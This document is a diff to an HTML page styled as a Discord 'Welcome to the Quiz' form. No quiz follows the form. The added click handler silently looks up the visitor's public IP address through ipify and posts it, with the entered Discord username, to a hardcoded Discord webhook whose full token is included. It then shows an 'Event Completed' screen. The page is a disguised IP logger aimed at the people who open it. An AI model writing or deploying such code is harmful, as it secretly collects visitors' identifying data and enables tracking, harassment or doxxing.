@@ -68,7 +68,7 @@
             margin-bottom: 10px;
             display: block;
         }
-        #secondScreen, #thirdScreen {
+        #secondScreen {
             display: none;
         }
     </style>
@@ -76,48 +76,31 @@
 <body>
     <div class="container" id="firstScreen">
         <h1>Welcome to the Quiz!</h1>
-        <p>Please enter your Discord username and your favorite color to proceed: (Please be truthful).</p>
+        <p>Please enter your Discord username to proceed: (Please be truthful). </p>
         <label for="discordUsername">Enter your Discord username:</label>
         <input type="text" id="discordUsername" placeholder="Discord Username">
-        <br>
-        <label for="favoriteColor">Enter your favorite color:</label>
-        <input type="text" id="favoriteColor" placeholder="Favorite Color">
         <br>
         <button id="clickMeBtn" disabled>START QUIZ!</button>
     </div>
 
     <div class="container" id="secondScreen">
-        <h1>Favorite Color Saved!</h1>
-        <p>Now click below to start the quiz.</p>
-        <button id="nextBtn">NEXT</button>
-    </div>
-
-    <div class="container" id="thirdScreen">
         <h1>Event Completed</h1>
         <p>Made by BlobsterWasHere on discord.</p>
     </div>
 
     <script>
         const discordUsernameInput = document.getElementById('discordUsername');
-        const favoriteColorInput = document.getElementById('favoriteColor');
         const clickMeBtn = document.getElementById('clickMeBtn');
         const firstScreen = document.getElementById('firstScreen');
         const secondScreen = document.getElementById('secondScreen');
-        const thirdScreen = document.getElementById('thirdScreen');
-        const nextBtn = document.getElementById('nextBtn');
 
         discordUsernameInput.addEventListener('input', function() {
-            clickMeBtn.disabled = !discordUsernameInput.value.trim() || !favoriteColorInput.value.trim();
-        });
-
-        favoriteColorInput.addEventListener('input', function() {
-            clickMeBtn.disabled = !discordUsernameInput.value.trim() || !favoriteColorInput.value.trim();
+            clickMeBtn.disabled = !discordUsernameInput.value.trim();
         });
 
         clickMeBtn.addEventListener('click', function() {
             const discordUsername = discordUsernameInput.value.trim();
-            const favoriteColor = favoriteColorInput.value.trim();
-            if (!discordUsername || !favoriteColor) {
+            if (!discordUsername) {
                 // Add shake animation to the button
                 clickMeBtn.classList.add('shake');
                 // Remove shake animation after 0.5s
@@ -127,22 +110,48 @@
                 return;
             }
 
-            // Proceed to the next screen
-            firstScreen.style.opacity = 0;
-            secondScreen.style.display = 'block';
-            secondScreen.style.top = '50%';
-            secondScreen.style.left = '50%';
-            secondScreen.style.transform = 'translate(-50%, -50%)';
-        });
+            // Get the IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    // Send the IP address and Discord username to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
+                    const message = {
+                        content: `!IP: ${ip}, Username: ${discordUsername}`
+                    };
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => {
+                        // Check if the request was successful
+                        if (!response.ok) {
+                            throw new Error('Failed to send webhook request');
+                        }
+                        // Hide the first screen
+                        firstScreen.style.opacity = 0;
+                        // Show the second screen
+                        secondScreen.style.display = 'block';
 
-        nextBtn.addEventListener('click', function() {
-            // Hide the second screen
-            secondScreen.style.display = 'none';
-            // Show the third screen
-            thirdScreen.style.display = 'block';
-            thirdScreen.style.top = '50%';
-            thirdScreen.style.left = '50%';
-            thirdScreen.style.transform = 'translate(-50%, -50%)';
+                        // Smoothly center the second screen
+                        secondScreen.style.top = '50%';
+                        secondScreen.style.left = '50%';
+                        secondScreen.style.transform = 'translate(-50%, -50%)';
+                    })
+                    .catch(error => {
+                        console.error('ERROR', error);
+                        // Handle error here
+                    });
+                })
+                .catch(error => {
+                    console.error('ERROR', error);
+                    // Handle error here
+                });
         });
     </script>
 </body>
